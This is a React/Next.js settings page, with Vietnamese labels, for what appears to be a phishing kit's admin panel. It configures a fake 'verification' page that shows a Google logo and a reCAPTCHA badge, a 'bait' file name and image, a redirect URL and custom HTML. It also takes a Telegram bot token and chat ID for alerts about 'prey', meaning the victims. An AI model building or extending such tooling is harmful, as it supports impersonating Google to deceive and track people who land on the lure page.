
"use client"

import * as React from "react"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import * as z from "zod"
import Image from "next/image"

import { SidebarProvider, SidebarInset, SidebarTrigger } from "@/components/ui/sidebar"
import { AppSidebar } from "@/components/layout/app-sidebar"
import { Button } from "@/components/ui/button"
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form"
import { useToast } from "@/hooks/use-toast"
import { getVerificationConfigAction, updateVerificationConfigAction, type VerificationConfig } from "@/app/actions/settings"
import { Save, ShieldAlert, Eye, Laptop, Smartphone, FileText, ShieldCheck, Send } from "lucide-react"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"

const formSchema = z.object({
  title: z.string().min(1, "Tiêu đề là bắt buộc."),
  description: z.string().min(1, "Mô tả là bắt buộc."),
  fileName: z.string().min(1, "Tên tệp là bắt buộc."),
  fileInfo: z.string().min(1, "Thông tin tệp là bắt buộc."),
  buttonText: z.string().min(1, "Văn bản nút là bắt buộc."),
  footerText: z.string().min(1, "Văn bản chân trang là bắt buộc."),
  redirectUrl: z.string().url("Phải là một URL hợp lệ."),
  imageUrl: z.string().url("Phải là một URL hình ảnh hợp lệ."),
  theme: z.string().min(1, "Chủ đề là bắt buộc."),
  customHtml: z.string().optional(),
  tgToken: z.string().optional(),
  tgChatId: z.string().optional(),
})

export default function SettingsPage() {
  const { toast } = useToast()
  const [loading, setLoading] = React.useState(true);
  const [previewDevice, setPreviewDevice] = React.useState<"desktop" | "mobile">("mobile");

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      title: "",
      description: "",
      fileName: "",
      fileInfo: "",
      buttonText: "",
      footerText: "",
      redirectUrl: "",
      imageUrl: "",
      theme: "default",
      customHtml: "",
      tgToken: "",
      tgChatId: "",
    },
  })

  const watchedValues = form.watch();

  React.useEffect(() => {
    async function loadSettings() {
      setLoading(true)
      try {
        const config = await getVerificationConfigAction()
        form.reset(config)
      } catch (error) {
        toast({
          variant: "destructive",
          title: "Lỗi",
          description: "Không thể tải cài đặt.",
        })
      }
      setLoading(false)
    }
    loadSettings()
  }, [form, toast])


  async function onSubmit(values: z.infer<typeof formSchema>) {
    setLoading(true)
    const result = await updateVerificationConfigAction(values)
    if (result.success) {
      toast({
        title: "Thành công",
        description: "Đã cập nhật cấu hình hệ thống.",
      })
      form.reset(values)
    } else {
      toast({
        variant: "destructive",
        title: "Lỗi",
        description: result.message,
      })
    }
    setLoading(false)
  }

  return (
    <SidebarProvider>
      <AppSidebar />
      <SidebarInset className="bg-[#05070a]">
        <header className="flex h-16 shrink-0 items-center gap-2 border-b border-slate-800 px-4 bg-black/50 backdrop-blur-md sticky top-0 z-50">
          <SidebarTrigger />
          <h1 className="text-xl font-bold font-headline uppercase italic text-white">Cấu Hình <span className="text-blue-500">Sentinel</span></h1>
          <div className="ml-auto flex items-center gap-2">
             <Button 
                variant="outline" 
                size="sm" 
                className="border-slate-800 bg-black text-white hover:bg-slate-900"
                onClick={form.handleSubmit(onSubmit)}
                disabled={loading || !form.formState.isDirty}
             >
                <Save className="h-4 w-4 mr-2" />
                Lưu cấu hình
             </Button>
          </div>
        </header>

        <main className="flex-1 overflow-hidden">
          <Tabs defaultValue="general" className="h-full flex flex-col">
            <div className="px-6 py-2 border-b border-slate-800 bg-black/20">
                <TabsList className="bg-slate-900/50 border border-slate-800">
                    <TabsTrigger value="general" className="data-[state=active]:bg-blue-600 data-[state=active]:text-white">Giao diện</TabsTrigger>
                    <TabsTrigger value="telegram" className="data-[state=active]:bg-blue-600 data-[state=active]:text-white">Telegram Bot</TabsTrigger>
                </TabsList>
            </div>

            <div className="flex-1 flex flex-col lg:flex-row overflow-hidden">
                <ScrollArea className="flex-1 p-6">
                    <Form {...form}>
                        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 max-w-2xl mx-auto pb-20">
                            <TabsContent value="general" className="mt-0 space-y-6">
                                <Card className="bg-[#0d1117] border-slate-800 shadow-xl">
                                    <CardHeader>
                                        <CardTitle className="text-white text-lg italic flex items-center gap-2">
                                            <Laptop className="h-5 w-5 text-blue-500" />
                                            GIAO DIỆN XÁC MINH
                                        </CardTitle>
                                    </CardHeader>
                                    <CardContent className="space-y-6">
                                        <FormField
                                            control={form.control}
                                            name="theme"
                                            render={({ field }) => (
                                            <FormItem>
                                                <FormLabel className="text-xs uppercase text-slate-500">Chủ đề màu sắc</FormLabel>
                                                <Select onValueChange={field.onChange} value={field.value} defaultValue={field.value}>
                                                <FormControl>
                                                    <SelectTrigger className="bg-black border-slate-800 text-white">
                                                    <SelectValue placeholder="Chọn một chủ đề" />
                                                    </SelectTrigger>
                                                </FormControl>
                                                <SelectContent className="bg-[#0d1117] border-slate-800 text-white">
                                                    <SelectItem value="default">Mặc định (Light)</SelectItem>
                                                    <SelectItem value="dark">Tối (Modern Dark)</SelectItem>
                                                    <SelectItem value="forest">Rừng cây (Green)</SelectItem>
                                                    <SelectItem value="sunset">Hoàng hôn (Warm)</SelectItem>
                                                </SelectContent>
                                                </Select>
                                            </FormItem>
                                            )}
                                        />
                                        
                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                            <FormField control={form.control} name="title" render={({ field }) => (
                                                <FormItem>
                                                    <FormLabel className="text-xs uppercase text-slate-500">Tiêu Đề Chính</FormLabel>
                                                    <FormControl><Input className="bg-black border-slate-800 text-white" {...field} /></FormControl>
                                                </FormItem>
                                            )} />
                                            <FormField control={form.control} name="buttonText" render={({ field }) => (
                                                <FormItem>
                                                    <FormLabel className="text-xs uppercase text-slate-500">Văn Bản Nút</FormLabel>
                                                    <FormControl><Input className="bg-black border-slate-800 text-white" {...field} /></FormControl>
                                                </FormItem>
                                            )} />
                                        </div>

                                        <FormField control={form.control} name="description" render={({ field }) => (
                                            <FormItem>
                                                <FormLabel className="text-xs uppercase text-slate-500">Văn Bản Mô Tả</FormLabel>
                                                <FormControl><Textarea className="bg-black border-slate-800 text-white" {...field} /></FormControl>
                                            </FormItem>
                                        )} />

                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                            <FormField control={form.control} name="fileName" render={({ field }) => (
                                                <FormItem>
                                                    <FormLabel className="text-xs uppercase text-slate-500">Tên Tệp Mồi</FormLabel>
                                                    <FormControl><Input className="bg-black border-slate-800 text-white" {...field} /></FormControl>
                                                </FormItem>
                                            )} />
                                            <FormField control={form.control} name="fileInfo" render={({ field }) => (
                                                <FormItem>
                                                    <FormLabel className="text-xs uppercase text-slate-500">Thông Tin Tệp</FormLabel>
                                                    <FormControl><Input className="bg-black border-slate-800 text-white" {...field} /></FormControl>
                                                </FormItem>
                                            )} />
                                        </div>

                                        <FormField control={form.control} name="imageUrl" render={({ field }) => (
                                            <FormItem>
                                                <FormLabel className="text-xs uppercase text-slate-500">URL Hình Ảnh Mồi</FormLabel>
                                                <FormControl><Input className="bg-black border-slate-800 text-white font-mono text-xs" {...field} /></FormControl>
                                            </FormItem>
                                        )} />

                                        <FormField control={form.control} name="redirectUrl" render={({ field }) => (
                                            <FormItem>
                                                <FormLabel className="text-xs uppercase text-slate-500">URL Chuyển Hướng Sau Xác Minh</FormLabel>
                                                <FormControl><Input className="bg-black border-slate-800 text-green-500 font-mono text-xs" {...field} /></FormControl>
                                            </FormItem>
                                        )} />

                                        <FormField control={form.control} name="customHtml" render={({ field }) => (
                                            <FormItem>
                                                <FormLabel className="text-xs uppercase text-slate-500">HTML Tùy Chỉnh (Nâng cao)</FormLabel>
                                                <FormControl><Textarea className="bg-black border-slate-800 text-blue-400 font-code text-[10px]" {...field} /></FormControl>
                                            </FormItem>
                                        )} />
                                    </CardContent>
                                </Card>
                            </TabsContent>

                            <TabsContent value="telegram" className="mt-0 space-y-6">
                                <Card className="bg-[#0d1117] border-slate-800 shadow-xl">
                                    <CardHeader>
                                        <CardTitle className="text-white text-lg italic flex items-center gap-2">
                                            <Send className="h-5 w-5 text-blue-500" />
                                            CẤU HÌNH BOT TELEGRAM
                                        </CardTitle>
                                        <CardDescription className="text-slate-500 italic text-xs">Nhận thông báo "con mồi" trực tiếp về điện thoại.</CardDescription>
                                    </CardHeader>
                                    <CardContent className="space-y-6">
                                        <FormField control={form.control} name="tgToken" render={({ field }) => (
                                            <FormItem>
                                                <FormLabel className="text-xs uppercase text-slate-500">Telegram Bot Token</FormLabel>
                                                <FormControl><Input className="bg-black border-slate-800 text-white font-mono" placeholder="123456789:ABCDE..." {...field} /></FormControl>
                                            </FormItem>
                                        )} />
                                        <FormField control={form.control} name="tgChatId" render={({ field }) => (
                                            <FormItem>
                                                <FormLabel className="text-xs uppercase text-slate-500">Telegram Chat ID</FormLabel>
                                                <FormControl><Input className="bg-black border-slate-800 text-white font-mono" placeholder="123456789" {...field} /></FormControl>
                                            </FormItem>
                                        )} />
                                        
                                        <Alert className="bg-blue-500/10 border-blue-500/20 text-blue-400">
                                            <ShieldCheck className="h-4 w-4" />
                                            <AlertTitle className="text-[10px] uppercase font-bold">Hướng dẫn</AlertTitle>
                                            <AlertDescription className="text-[10px] normal-case">
                                                1. Tạo bot qua @BotFather để lấy Token.<br/>
                                                2. Chat với @userinfobot để lấy Chat ID cá nhân.
                                            </AlertDescription>
                                        </Alert>
                                    </CardContent>
                                </Card>
                            </TabsContent>
                        </form>
                    </Form>
                </ScrollArea>

                <div className="hidden lg:flex w-[450px] border-l border-slate-800 bg-black flex-col">
                    <div className="p-4 border-b border-slate-800 flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            <Eye className="h-4 w-4 text-blue-500" />
                            <span className="text-[10px] uppercase font-black text-slate-500 tracking-widest">LIVE PREVIEW</span>
                        </div>
                        <div className="flex bg-[#0d1117] rounded-lg p-1">
                            <button onClick={() => setPreviewDevice("mobile")} className={`p-1.5 rounded-md ${previewDevice === "mobile" ? "bg-blue-600 text-white" : "text-slate-500"}`}><Smartphone className="h-3.5 w-3.5" /></button>
                            <button onClick={() => setPreviewDevice("desktop")} className={`p-1.5 rounded-md ${previewDevice === "desktop" ? "bg-blue-600 text-white" : "text-slate-500"}`}><Laptop className="h-3.5 w-3.5" /></button>
                        </div>
                    </div>
                    <div className="flex-1 overflow-hidden p-6 flex items-start justify-center bg-[#05070a]">
                        <div className={`border border-slate-800 overflow-hidden ${previewDevice === "mobile" ? "w-[300px] h-[520px] rounded-[2.5rem]" : "w-full h-[380px] rounded-2xl"}`}>
                        <ScrollArea className="h-full bg-white">
                            <div className={`p-6 text-center font-bold italic min-h-full flex flex-col items-center justify-center ${watchedValues.theme === 'dark' ? 'bg-zinc-950 text-white' : watchedValues.theme === 'forest' ? 'bg-green-50' : watchedValues.theme === 'sunset' ? 'bg-orange-50' : 'bg-white'}`}>
                                <Image src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" width={92} height={30} className="h-4 mx-auto mb-10 opacity-70" />
                                <div className="w-full">
                                    <div className="bg-gray-50/50 p-4 rounded-2xl border border-gray-100 mb-6 dark:bg-zinc-900 dark:border-zinc-800">
                                        <div className="flex items-center gap-2 mb-4 text-left px-2">
                                            <FileText className="h-4 w-4 text-blue-500 opacity-60" />
                                            <span className="text-[9px] text-gray-400 uppercase truncate">{watchedValues.fileName}</span>
                                        </div>
                                        <div className="aspect-video w-full rounded-xl overflow-hidden mb-2 bg-slate-100">
                                            {watchedValues.imageUrl && <img src={watchedValues.imageUrl} className="object-cover w-full h-full grayscale opacity-50" />}
                                        </div>
                                        <div className="text-[8px] text-gray-400 uppercase text-left px-2">{watchedValues.fileInfo}</div>
                                    </div>
                                    <div className="mb-4">
                                        <h2 className="text-xs uppercase mb-1">{watchedValues.title}</h2>
                                        <p className="text-[9px] text-gray-400 normal-case font-normal leading-relaxed">{watchedValues.description}</p>
                                    </div>
                                    <button className="p-5 bg-white border border-gray-100 rounded-3xl w-full shadow-md text-[9px] uppercase flex justify-between items-center text-gray-700 dark:bg-zinc-900 dark:border-zinc-800 dark:text-white">
                                        <span>{watchedValues.buttonText}</span>
                                        <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width={16} height={16} className="opacity-40" />
                                    </button>
                                </div>
                            </div>
                        </ScrollArea>
                        </div>
                    </div>
                </div>
            </div>
          </Tabs>
        </main>
      </SidebarInset>
    </SidebarProvider>
  )
}
